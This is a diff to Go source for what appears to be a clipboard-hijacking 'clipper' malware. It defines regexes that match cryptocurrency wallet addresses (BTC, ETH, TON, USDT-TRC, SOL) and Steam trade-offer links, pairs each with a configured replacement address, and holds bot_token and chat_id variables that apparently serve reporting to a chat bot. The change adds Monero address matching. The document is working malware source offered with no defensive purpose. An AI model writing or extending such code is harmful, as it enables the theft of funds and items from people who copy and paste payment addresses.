@@ -21,6 +21,7 @@ var (
 	tonRegex     = regexp.MustCompile(`^(?:EQ|UQ)[0-9A-Za-z_-]{46,48}$`)
 	usdttrcRegex = regexp.MustCompile(`^T[1-9A-HJ-NP-Za-km-z]{33}$`)
 	solRegex     = regexp.MustCompile(`^[1-9A-HJ-NP-Za-km-z]{32,44}$`)
+	xmrRegex     = regexp.MustCompile(`^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$`)
 	
 	steamTradeRegex = regexp.MustCompile(`(https?:\/\/)?steamcommunity\.com\/tradeoffer\/new\/\?partner=\d+(&token=[\w\-]+)?`)
 )
@@ -33,13 +34,13 @@ var (
 	TonAddr     string
 	UsdtTrcAddr string
 	SolAddr     string
+	XmrAddr     string
 	SteamAddr   string
 )
 
 var (
 	bot_token   string
 	chat_id     string
-
 	blockedGeos string
 )
 
@@ -51,6 +52,7 @@ var matchers = []clipper.Matcher{
 	{Regex: tonRegex, Addr: TonAddr},
 	{Regex: usdttrcRegex, Addr: UsdtTrcAddr},
 	{Regex: solRegex, Addr: SolAddr},
+	{Regex: xmrRegex, Addr: XmrAddr},
 	{Regex: steamTradeRegex, Addr: SteamAddr},
 }
 
@@ -61,7 +63,7 @@ func main() {
 
 	// we checking addresses
 	if BtcAddr == "" && EthAddr == "" && LtcAddr == "" && DogeAddr == "" && 
-	   TonAddr == "" && UsdtTrcAddr == "" && SolAddr == "" && SteamAddr == "" {
+	   TonAddr == "" && UsdtTrcAddr == "" && SolAddr == "" && XmrAddr == "" && SteamAddr == "" {
 		fmt.Println("No addresses configured. Please rebuild with proper addresses.")
 		return
 	}
